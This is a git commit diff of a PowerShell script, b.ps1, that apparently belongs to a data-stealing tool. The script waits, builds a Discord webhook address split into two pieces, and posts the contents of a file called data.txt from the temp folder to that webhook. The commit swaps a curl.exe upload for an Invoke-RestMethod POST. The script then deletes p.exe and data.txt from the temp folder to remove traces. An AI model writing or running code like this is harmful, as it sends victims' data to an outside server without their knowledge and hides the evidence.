f139fe03093a53cb877acb13071066bbc948c5d6
nonamezxcvbnm <122991811+nonamezxcvbnm@users.noreply.github.com>
2023-02-07 10:31:27 +0100

    Update b.ps1

--- b.ps1
+++ b.ps1
@@ -4,7 +4,8 @@ Start-Sleep -Seconds 2;
 Start-Sleep -Seconds 1;
 
 $webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
-curl.exe -F "file1=@$env:TEMP\data.txt" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");
+$payload = @{ content = [IO.File]::ReadAllText("$env:TEMP\data.txt") };
+Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
 
 Remove-Item -Path "$env:TEMP\p.exe";
 Remove-Item -Path "$env:TEMP\data.txt";
